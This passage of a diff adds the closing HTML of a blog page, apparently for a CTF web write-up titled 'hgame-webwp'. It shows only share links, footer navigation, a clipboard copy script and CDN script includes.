+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&title=hgame-webwp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&name=hgame-webwp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/&t=hgame-webwp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
